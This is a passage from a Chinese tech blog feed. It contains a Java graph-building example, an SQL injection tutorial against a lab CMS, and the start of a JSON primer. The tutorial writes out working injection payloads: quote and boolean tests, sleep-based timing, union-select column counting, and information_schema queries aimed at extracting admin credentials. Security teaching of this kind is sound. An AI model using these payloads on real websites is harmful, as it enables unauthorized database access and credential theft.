punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> weight<span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> from<span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token keyword">to</span><span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//如果没有节点编号就去创建节点</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token class-name">Node</span> fromNode <span class="token operator">=</span> g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取from节点</span><span class="token class-name">Node</span> toNode<span class="token operator">=</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取to节点</span><span class="token class-name">Edge</span> edge<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span>weight<span class="token punctuation">,</span> fromNode<span class="token punctuation">,</span> toNode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//建立一条边</span>g<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//放到g的边集合中</span>fromNode<span class="token punctuation">.</span>nexts<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>toNode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//from节点添加下行节点</span>fromNode<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//from 节点添加下行边</span>fromNode<span class="token punctuation">.</span>out<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//from节点出度++</span>toNode<span class="token punctuation">.</span>in<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//to节点入度++</span><span class="token punctuation">}</span><span class="token keyword">return</span> g<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> test <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token class-name">Graph</span> graph <span class="token operator">=</span> <span class="token function">createGraphFromMatrix</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"节点数:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"边数:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1的入度:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>in<span class="token operator">+</span><span class="token string">",1的出度:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1到3的代价:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>weight<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2022/10/09/shu-ju-jie-gou-yu-suan-fa/tu-tu-de-tong-yong-jie-gou-biao-da-de-jian-li/1009-01.jpeg" alt="测试图例" style="zoom:50%;"><p>运行结果</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">节点数:4边数:31的入度:0,1的出度:11到3的代价:4done!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/si-xiao-kai/AlgorithmDataStructure_stu/tree/main/base_graph">完整代码见我的github</a></p><h1 id="6-小结"><a href="#6-小结" class="headerlink" title="6.小结"></a>6.小结</h1><p>本文介绍了一个非常有用的图结构的表达方法，方便在上面实现图的各种算法，并且可以很方便的将其他形式的图的表示如邻接表、邻接矩阵等转化过来，进而避免了在不同结构上重新实现图算法的繁琐操作。后续会陆续讲解基于本文定义的图结构实现的各种图算法。</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> java </tag>
            
            <tag> 图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入基础</title>
      <link href="/2022/10/04/web-an-quan/sql-zhu-ru/"/>
      <url>/2022/10/04/web-an-quan/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-SQL注入简介"><a href="#一、-SQL注入简介" class="headerlink" title="一、 SQL注入简介"></a>一、 SQL注入简介</h1><h2 id="1-1-SQL简介"><a href="#1-1-SQL简介" class="headerlink" title="1.1 SQL简介"></a>1.1 SQL简介</h2><p>结构化查询语言 （Structured Query Language）是关系式数据库管理系统的标准语言（ANSI X3.135 - 1986），实际上不同数据库系统之间的SQL不能完全相互通用。</p><h3 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h3><ul><li><p>特点：明显的层次结构， 库名|表名|字段名|字段内容</p></li><li><p>例子：mysql、access、 Mssql、orcale</p></li></ul><h2 id="1-2-sql注入"><a href="#1-2-sql注入" class="headerlink" title="1.2 sql注入"></a>1.2 sql注入</h2><p> 一种常见的Web安全漏洞，攻击者利用这个漏洞，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。</p><p><u>攻击者通过向【用户可控参数】中注入SQL语法，【破坏原有SQL结构】达到编写程序时意料之外结果的攻击行为。</u></p><ul><li>漏洞原理：</li></ul><p>1、程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造SQL语句。</p><p>2、未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中。</p><h2 id="1-3-注入点可能存在的位置"><a href="#1-3-注入点可能存在的位置" class="headerlink" title="1.3 注入点可能存在的位置"></a>1.3 注入点可能存在的位置</h2><p>Web应用在获取用户数据的地方，只要带入数据库查询，都有存在SQL注入的可能，这些地方通常包括:</p><p>1）@GET数据</p><p>2）@POST数据</p><p>3）@Cookie数据</p><p>4）@HTTP 头部（HTTP 请求报文其他字段）</p><p>GPC是最常用的三种提交数据的方法。</p><h2 id="1-4-SQL注入漏洞的危害"><a href="#1-4-SQL注入漏洞的危害" class="headerlink" title="1.4 SQL注入漏洞的危害"></a>1.4 SQL注入漏洞的危害</h2><p>1）增删改查：操作数据库数据。</p><p>2）脱库：获取数据库中的多种信息(例如:管理员后台密码)，从而脱取数据库中内容(脱库)</p><p>3）提权：如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接写入webshell或者获取服务器系统权限。例如：mof提权｜udf提权</p><h2 id="1-5-SQL注入分类"><a href="#1-5-SQL注入分类" class="headerlink" title="1.5 SQL注入分类"></a>1.5 SQL注入分类</h2><p>⚠️：数据库中三种数据类型数字、文本、时间。</p><h3 id="1-5-1-从数据类型的角度分类"><a href="#1-5-1-从数据类型的角度分类" class="headerlink" title="1.5.1 从数据类型的角度分类"></a>1.5.1 从数据类型的角度分类</h3><p>数字型：数字型注入就是说注入点的数据，拼接到SQL语句中是以数字型出现的，即数据两边没有被单引号、双引号包括。</p><p>字符型：字符型注入正好相反。</p><h3 id="1-5-2-从注入手法的角度分类"><a href="#1-5-2-从注入手法的角度分类" class="headerlink" title="1.5.2 从注入手法的角度分类"></a>1.5.2 从注入手法的角度分类</h3><p>1）联合查询：UNION query SQL injection （可联合查询注入）</p><p>2）布尔盲注：Boolean-based blind SQL injection （布尔型注入）</p><p>3）延时注入：Time-based blind SQL inj ection （基于时间延迟注入）</p><p>4）报错注入：Error-based SQL injection （报错型注入）</p><p>5）堆叠查询：Stacked queries SQL injection （可多语句查询注入）</p><h3 id="1-5-3-从注入的位置角度分类"><a href="#1-5-3-从注入的位置角度分类" class="headerlink" title="1.5.3 从注入的位置角度分类"></a>1.5.3 从注入的位置角度分类</h3><ul><li><p>GET注入</p></li><li><p>POST注入</p></li><li><p>Cookie注入</p></li><li><p>HTTP其他头字段注入</p></li><li><p>【留言板注入</p></li><li><p>搜索框注入</p></li><li><p>…】</p></li></ul><h1 id="二、Mysql基础知识"><a href="#二、Mysql基础知识" class="headerlink" title="二、Mysql基础知识"></a>二、Mysql基础知识</h1><h2 id="2-1-mysql注释"><a href="#2-1-mysql注释" class="headerlink" title="2.1 mysql注释"></a>2.1 mysql注释</h2><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 【HTTP头部注入】-- 【--空格、--+ URL注入、如果在URL注入中使用#，要将其编码为%23】/*...*/ /*!...*/ 【内联查询】<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-元数据"><a href="#2-2-元数据" class="headerlink" title="2.2 元数据"></a>2.2 元数据</h2><p>库名、表名、字段名等信息</p><h2 id="2-3-mysql元数据数据库（information-schema）"><a href="#2-3-mysql元数据数据库（information-schema）" class="headerlink" title="2.3 mysql元数据数据库（information_schema）"></a>2.3 mysql元数据数据库（information_schema）</h2><h3 id="2-3-1-information-schema的信息"><a href="#2-3-1-information-schema的信息" class="headerlink" title="2.3.1 information_schema的信息"></a>2.3.1 information_schema的信息</h3><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2024-12-05%2017.27.55.png" alt="information_schema的关键信息" style="zoom:40%;"><ul><li><p>表所属库的信息？tables-table_schema</p></li><li><p>字段所属的表名？columns-table_name</p></li><li><p>字段所属的库名？columns-table_schema</p></li><li><p>所有的表名？tables-table_name</p></li><li><p>所有的字段名？columns-column_name</p></li></ul><h4 id="EX：实验操作"><a href="#EX：实验操作" class="headerlink" title="EX：实验操作"></a>EX：实验操作</h4><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122161518766-2263322.png" alt="元数据库操作示例" style="zoom:90%;"><h3 id="5-5-4-Mysql-常用函数与参数"><a href="#5-5-4-Mysql-常用函数与参数" class="headerlink" title="5.5.4 Mysql 常用函数与参数"></a>5.5.4 Mysql 常用函数与参数</h3><p>常用函数列表：</p><table><thead><tr><th>=|&gt;|&gt;=|&lt;=|&lt;&gt;</th><th>比较运算符</th></tr></thead><tbody><tr><td>and|or</td><td>逻辑运算符  ⚠️：true 1 false 0，比较运算符和逻辑运算符的结果是 1和0.</td></tr><tr><td>version()</td><td>mysql  数据库版本</td></tr><tr><td>database()</td><td>当前数据库名</td></tr><tr><td>user()</td><td>用户名</td></tr><tr><td>current_user()</td><td>当前用户名</td></tr><tr><td>system_user()</td><td>系统用户名</td></tr><tr><td>@@datadir</td><td>数据库路径</td></tr><tr><td>@@versoin_compile_os</td><td>操作系统版本</td></tr><tr><td>length()</td><td>返回字符串的长度</td></tr><tr><td>substring()</td><td>截取字符串</td></tr><tr><td>substr()</td><td>1. 截取的字符串  2. 截取起始位置，从1开始计数  3. 截取长度</td></tr><tr><td>mid()</td><td></td></tr><tr><td>left()</td><td>从左侧开始取指定字符个数的字符串</td></tr><tr><td>concat()</td><td>没有分隔符的连接字符串</td></tr><tr><td>concat_ws()</td><td>含有分割符的连接字符串</td></tr><tr><td>group_concat()</td><td>连接一个组的字符串</td></tr><tr><td>ord()</td><td>返回ASCII 码</td></tr><tr><td>ascii()</td><td>返回ASCII 码</td></tr><tr><td>hex()</td><td>将字符串转换为十六进制</td></tr><tr><td>unhex()</td><td>hex 的反向操作</td></tr><tr><td>md5()</td><td>返回MD5 值</td></tr><tr><td>floor(x)</td><td>返回不大于x 的最大整数</td></tr><tr><td>round()</td><td>返回参数x 接近的整数</td></tr><tr><td>rand()</td><td>返回0-1 之间的随机浮点数</td></tr><tr><td>load_file()</td><td>读取文件，并返回文件内容作为一个字符串</td></tr><tr><td>sleep()</td><td>睡眠时间为指定的秒数</td></tr><tr><td>if(true,t,f)</td><td>if 判断</td></tr><tr><td>find_in_set()</td><td>返回字符串在字符串列表中的位置</td></tr><tr><td>benchmark()</td><td>指定语句执行的次数</td></tr><tr><td>name_const()</td><td>返回表作为结果</td></tr></tbody></table><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122162522971-2263927.png" alt="函数操作示例" style="zoom:90%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122162852365-2264134.png" alt="比较运算符" style="zoom:80%;"><h1 id="三、注入点的判断"><a href="#三、注入点的判断" class="headerlink" title="三、注入点的判断"></a>三、注入点的判断</h1><h2 id="3-1-以CMS站点为例"><a href="#3-1-以CMS站点为例" class="headerlink" title="3.1 以CMS站点为例"></a>3.1 以CMS站点为例</h2><p>（win2008-cms站点 -注入点判断）</p><p>为了演示SQL注入的四大基本手法，我们以CMS为例。 [http: //ip/ cms/]</p><ul><li>环境：</li></ul><p>​        环境-win2008-cms站点 </p><p>​        攻击者：win10 ICS 工具：【御剑-后台扫描】</p><ul><li>目标：</li></ul><p>​通过SQL注入漏洞获得后台管理员帐密并成功登录系统。</p><p>​后台地址[<a href="http://172.16.132.138/cms/admin/]">http://172.16.132.138/cms/admin/]</a></p><ul><li><p>四大基本手法可行性判断</p><ul><li>联合查询</li><li>报错注入</li><li>布尔盲注</li><li>延时注入</li></ul><p>对链接 [http:/ /172.16.132.138/ cms/show. php?id=33]是否是注入点进行判断。</p></li></ul><h2 id="3-2-数据库回显"><a href="#3-2-数据库回显" class="headerlink" title="3.2 数据库回显"></a>3.2 数据库回显</h2><p>当我们变换id参数(33+1|33-1) 的时候，发现同一个页面，show. php页面展现出不同的新闻内容。也就是说，数据库中的内容会回显到网页中来。初步判定，id参数会带入数据库查询，根据不同的id查询数据库，得到不同的新闻内容。猜测后台执行的SQL语句大致结构为:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> dbName <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-判断数字型还是字符型、是否可以进行报错注入"><a href="#3-3-判断数字型还是字符型、是否可以进行报错注入" class="headerlink" title="3.3 判断数字型还是字符型、是否可以进行报错注入"></a>3.3 判断数字型还是字符型、是否可以进行报错注入</h2><p>单引号</p><p>[?id=33’]</p><p>执行的SQL主语则变为</p><p>select * from tbName where id=33’ ; </p><p>页面报错，并且报错信息会回显在网页中，报错信息如下</p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL</p><p>server version for the right syntax to use near ‘ ‘ ‘ at line 1</p><p>错误信息提示单引号位置出现错误，那么说明，SQL语句从头到参数33都是正确的。也就是说，我们添加的单引号是多余的。因此，可以断定参数33前面没有引号。则，此注入点(可能)为数字型注入。</p><blockquote><p><strong>数字型？字符型？</strong><br>    注意报错信息的原理：从第一个字符开始往后读，读到语法错误然后报错。<br>    上述报错信息说明，’”‘之前都是正确的。’’是报错信息的单引号。<br>    规律：报错信息不出现数字-数字型、报错信息出现数字-字符型。</p></blockquote><h2 id="3-4-判断布尔状态是否存在"><a href="#3-4-判断布尔状态是否存在" class="headerlink" title="3.4 判断布尔状态是否存在"></a>3.4 判断布尔状态是否存在</h2><ul><li>[and 1=1]</li></ul><p>[?id=33 and 1=1 – +]</p><p>可能得SQL语句为</p><p>select * from tbName where id=33 and 1=1 –+</p><p>页面正常。存在延时状态是否存在 </p><ul><li>[and 1=2]</li></ul><p>[?id=33 and 1=2 – -+]</p><p>可能得SQL语句</p><p>select * from dbName where id=33 and 1=2 –+</p><p>页面没有新闻内容，并且数据库没有报错。由于1=2是恒假式，也就是查询条件</p><p>[where id=33 and 1=2 –+]恒假，这样的SQL语句在数据库中执行后，没有返回结果，没有新闻内容。</p><p>反过来看，页面没有新闻内容，也就是SQL语句查询条件为假。也就是说，我们写的语句</p><p>[and 1=2 –+], 起到了将查询条件置为假的作用。</p><p>那么，可以通过构造语句来控制SQL语句的查询结果并且，SQL语句查询条件真假性，在页面回显中有体现。</p><h2 id="3-5-存在延时状态是否存在"><a href="#3-5-存在延时状态是否存在" class="headerlink" title="3.5 存在延时状态是否存在"></a>3.5 存在延时状态是否存在</h2><ul><li>[and sleep(5) ]</li></ul><p>[?id=33 and sleep(5)]</p><p>注入sleep(5)语句，可以通过网络时间线看到延时。</p><p>说明sleep(5)语句起到了作用。</p><p>综上，此连接存在SQL注入漏洞。</p><h2 id="EX：-CMS站点SQL注入漏洞存在性和注入点判断"><a href="#EX：-CMS站点SQL注入漏洞存在性和注入点判断" class="headerlink" title="EX： CMS站点SQL注入漏洞存在性和注入点判断"></a>EX： CMS站点SQL注入漏洞存在性和注入点判断</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122163931252-2264775.png" alt="CMS站点SQL注入漏洞存在性和注入点判断" style="zoom:80%;"><h2 id="3-6-总结"><a href="#3-6-总结" class="headerlink" title="3.6 总结"></a>3.6 总结</h2><p>再赘述一遍。</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122164606984.png" alt="手工判断注入点的方法总结" style="zoom:80%;"><h1 id="四、联合查询注入"><a href="#四、联合查询注入" class="headerlink" title="四、联合查询注入"></a>四、联合查询注入</h1><h2 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 概述"></a>4.1 概述</h2><p>由于数据库中的内容会回显到页面中来，所以我们可以采用联合查询进行注入。 联合查询就是SQL语法中的union select 语句。 该语句会同时执行两条select语句，生成两张虚拟表，然后把查询到的结果进行拼接。 select ～～～ union select～～～ 由于虚拟表是二维结构，联合查询会”纵向”拼接，两张虚拟的表。<br>        联合查询的强大之处：【可以跨库跨表查询】。</p><h2 id="4-2-必要条件"><a href="#4-2-必要条件" class="headerlink" title="4.2 必要条件"></a>4.2 必要条件</h2><ul><li><p>两张虚拟的表具有相同的列数</p></li><li><p>虚拟表对应的列的数据类型相同</p></li></ul><h2 id="4-3-判断字段个数"><a href="#4-3-判断字段个数" class="headerlink" title="4.3 判断字段个数"></a>4.3 判断字段个数</h2><h3 id="4-3-1-order-by"><a href="#4-3-1-order-by" class="headerlink" title="4.3.1 order by"></a>4.3.1 order by</h3><ul><li>方法原理</li></ul><p>可以使用[order by]语句来判断当前select语句所查询的虚拟表的列数。 [order by]语句本意是按照某一列进行排序， 在mysql中可以使用数字来代替具体的列名，比如[order by 1] 就是按照第一列进行排序， 如果mysql没有找到对应的列，就会报错[Unknown co Lumn]。我们可以依次增加数字，直到数据库报错。</p><ul><li>案例：</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165104614-2265467.png" alt="order by判断字段个数示例" style="zoom:80%;"><h3 id="4-3-2-union-select"><a href="#4-3-2-union-select" class="headerlink" title="4.3.2 union select"></a>4.3.2 union select</h3><p>union select null,null,—,null–+</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">35</span> union <span class="token keyword">select</span> null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--+http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">35</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,3,4,5,6,7,8,9,10,11,12,13,14,15--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>案例</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165338390-2265620.png" alt="union select判断字段个数示例" style="zoom:90%;"><ul><li>使用hackbar插件</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165422148.png" alt="hackbar插件使用示例" style="zoom:80%;"><h2 id="4-4-判断数据显示位置"><a href="#4-4-判断数据显示位置" class="headerlink" title="4.4 判断数据显示位置"></a>4.4 判断数据显示位置</h2><p>得到字段个数之后，可以尝试构造联合查询语句。<br>       这里我们并不知道表名，根据mysql数据库特性，select语句在执行的过程中，并不需要指定表名。<br>       [?id=33 union select 1,2,3,4,5,6,7,8,9,10,11, 12,13,14,15–+]<br>       [?id=33 union select null, null, null, null, null, null, null, null, null, null, null, null, null, null,null–+]<br>      页面显示的是第一张虚拟表的内容，那么我们可以考虑让第一张虚拟表的查询条件为假，则显示第二条记录。因此构造SQL语句:<br>      [?id=33 and 1=2 union select 1,2,3,4,5,6,7,8,9, 10,11, 12,13,14,15 –+]<br>      [?id=-33 union select 1,2,3,4,5,6, 7,8,9,10, 11,12,13,14,15 –+]</p><ul><li>案例</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165657390.png" alt="判断数据显示位置" style="zoom:80%;"><h2 id="4-6-数据库名和数据库版本信息获取"><a href="#4-6-数据库名和数据库版本信息获取" class="headerlink" title="4.6 数据库名和数据库版本信息获取"></a>4.6 数据库名和数据库版本信息获取</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165724657-2265846.png" alt="数据库名和数据库版本信息获取" style="zoom:80%;"><p>version()函数获取版本信息。</p><h2 id="4-7-获取目标数据库数据表名"><a href="#4-7-获取目标数据库数据表名" class="headerlink" title="4.7 获取目标数据库数据表名"></a>4.7 获取目标数据库数据表名</h2><h3 id="4-7-1-暴力破解的思路"><a href="#4-7-1-暴力破解的思路" class="headerlink" title="4.7.1 暴力破解的思路"></a>4.7.1 暴力破解的思路</h3><ul><li>案例</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165838388.png" alt="暴力破解的思路" style="zoom:80%;"><h3 id="4-7-2-利用information-schema数据库获取"><a href="#4-7-2-利用information-schema数据库获取" class="headerlink" title="4.7.2 利用information_schema数据库获取"></a>4.7.2 利用information_schema数据库获取</h3><ul><li>获取思路</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165934014.png" alt="image-20241122165934014" style="zoom:90%;"><ul><li>获取关于目标数据库的所有表名</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170057236.png" alt="获取关于目标数据库的所有表名" style="zoom:80%;"><h2 id="4-8-获取目标数据表字段名"><a href="#4-8-获取目标数据表字段名" class="headerlink" title="4.8 获取目标数据表字段名"></a>4.8 获取目标数据表字段名</h2><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">http://192.168.33.4/cms/show.php ?id=-35 union select 1,2,3,4,5,6,7,8,9,10,hex(group_concat(column_name)),12,13,14,15 from information_schema.columns where table_schema=database() and table_name=cms_users--+ 为了避免单引号的使用，将cms_users转化成十六进制形式。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>案例</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170337710.png" alt="获取目标数据表字段名" style="zoom:80%;"><h2 id="4-8-获取字段的值"><a href="#4-8-获取字段的值" class="headerlink" title="4.8 获取字段的值"></a>4.8 获取字段的值</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170421214.png" alt="获取字段的值" style="zoom:80%;"><h2 id="4-9-解密hash值"><a href="#4-9-解密hash值" class="headerlink" title="4.9 解密hash值"></a>4.9 解密hash值</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170556162.png" alt="解密hash值" style="zoom:80%;"><h2 id="4-10-登录后台"><a href="#4-10-登录后台" class="headerlink" title="4.10 登录后台"></a>4.10 登录后台</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170615237-2266376.png" alt="登录后台" style="zoom:80%;">]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> sql注入基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>轻量级的数据交换格式JSON</title>
      <link href="/2022/01/09/qian-hou-duan-kai-fa/qing-liang-ji-de-shu-ju-jiao-huan-ge-shi-json/"/>
      <url>/2022/01/09/qian-hou-duan-kai-fa/qing-liang-ji-de-shu-ju-jiao-huan-ge-shi-json/</url>
      
        <content type="html"><![CDATA[<h1 id="一、json简介"><a href="#一、json简介" class="headerlink" title="一、json简介"></a>一、json简介</h1><p>JSON（JavaScript Object Notation）是一种轻量级的数据交换格式，易于人阅读和编写，同时也易于机器解析和生成。它基于JavaScript的一个子集，但已经成为一种独立的格式，广泛用于各种编程语言中，用于数据的表示和交换。</p><h1 id="二、json语法"><a href="#二、json语法" class="headerlink" title="二、json语法"></a>二、json语法</h1><p>JSON 语法是 JavaScript 语法的子集。</p><h2 id="2-1-JSON-的基本语法"><a href="#2-1-JSON-的基本语法" class="headerlink" title="2.1 JSON 的基本语法"></a>2.1 JSON 的基本语法</h2><ul><li>数据在<strong>名称/值</strong>对中</li><li>数据由逗号 <strong>,</strong> 分隔</li><li>使用斜杆 *<em>*</em> 来转义字符</li><li>大括号 <strong>{}</strong> 保存对象</li><li>中括号 <strong>[]</strong> 保存数组，数组可以包含多个对象</li></ul><h2 id="2-2-JSON-的两种结构"><a href="#2-2-JSON-的两种结构" class="headerlink" title="2.2 JSON 的两种结构"></a>2.2 <strong>JSON 的两种结构</strong></h2><h3 id="2-1-1-对象（Object）"><a href="#2-1-1-对象（Object）" class="headerlink" title="2.1.1 对象（Object）"></a>2.1.1 